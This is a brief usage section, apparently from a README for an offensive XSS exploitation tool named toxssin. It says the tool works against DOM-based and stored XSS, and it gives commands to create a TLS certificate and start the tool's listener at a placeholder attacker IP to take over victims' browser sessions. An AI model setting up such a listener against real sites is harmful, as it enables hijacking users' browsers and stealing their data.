# 02 - Interact Session

Note: you have to run this as root. Currently I tested two vulnerable XSS types and they are **DOM-Based XSS** and **Stored XSS**. **Reflective XSS** doesn't work. 

```
# openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

# toxssin -u https://<attacker_IP> -c /absolute/path/to/cert.pem -k /absolute/path/to/key.pem
```
